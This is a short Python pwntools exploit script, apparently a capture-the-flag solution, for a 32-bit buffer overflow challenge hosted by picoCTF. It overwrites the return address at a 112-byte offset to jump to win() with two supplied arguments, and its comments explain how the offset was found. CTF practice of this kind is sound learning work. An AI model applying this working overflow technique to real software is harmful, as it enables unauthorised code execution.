from pwn import*

conn = remote('saturn.picoctf.net', 64102)
# p = process("vuln")
elf = context.binary = ELF("vuln")
addr_in_dec = elf.sym['win']


'''
stack grows downwards
|  LIFO now makes sense LMAO 
|  main
|  puts
|  EIP
|  buffer   ^^^^ buffer overflow over-writes UPWARDS (hence why we are able to verwrite EIP (return address) + add arguments after)
'''

'''

figured this out with cyclic 200
then found where it crashed by doing the following in GDB:
- frame info 
- i r eip -> returns some hex

we take this hex and do cyclic -l HEX_VAL to figure out how many characters we need to overflow.

'''
offset = 112
endian_addr_of_win = p32(addr_in_dec)
payload = b"A"*offset + endian_addr_of_win




arg1 = p32(0xCAFEF00D)
arg2 = p32(0xF00DF00D)


# NOTE: why do we need this padding here?
# over-write the EDP register, not important, thing is win() will look for the arguments
# of the function and they need to be AFTER EDP, so we need to do 4 bytes of padding.
payload += b'B' * 4 
payload += arg1
payload += arg2

print(f"PAYLOAD: {payload}")

# p.sendline(payload)
# p.interactive()
conn.sendline(payload)
conn.interactive()